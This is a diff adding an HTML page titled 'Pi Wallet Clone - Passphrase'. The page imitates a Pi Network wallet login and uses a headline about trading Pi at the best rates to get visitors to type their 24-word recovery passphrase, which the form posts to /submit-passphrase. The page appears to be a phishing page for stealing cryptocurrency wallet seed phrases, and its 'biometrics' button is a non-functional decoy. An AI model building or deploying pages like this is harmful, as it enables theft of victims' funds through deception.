@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Pi Wallet Clone - Passphrase</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #0b2545;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      text-align: center;
+      width: 90%;
+      max-width: 480px;
+      background-color: #152f61;
+      padding: 30px;
+      border-radius: 12px;
+    }
+    .headline {
+      font-weight: bold;
+      font-size: 14px;
+      margin-bottom: 20px;
+      color: #8ecae6;
+      text-transform: uppercase;
+    }
+    h2 {
+      margin-bottom: 15px;
+    }
+    textarea {
+      width: 100%;
+      height: 120px;
+      font-size: 16px;
+      padding: 10px;
+      border-radius: 8px;
+      border: none;
+      resize: none;
+      box-sizing: border-box;
+      outline: none;
+    }
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 14px 0;
+      background-color: #219ebc;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #126782;
+    }
+    .biometric-btn {
+      background-color: #023047;
+      margin-top: 10px;
+    }
+    .biometric-btn:hover {
+      background-color: #021f34;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="headline">
+      LOGIN TO YOUR WALLET TO ACCESS AND TRADE YOUR PI AT THE BEST GPM RATES
+    </div>
+    <h2>Enter your passphrase</h2>
+    <form method="POST" action="/submit-passphrase">
+      <textarea name="passphrase" placeholder="Enter your 24-word passphrase here..." required></textarea>
+      <button type="submit">Unlock with passphrase</button>
+    </form>
+    <button class="biometric-btn">Unlock with biometrics</button>
+  </div>
+</body>
+</html>
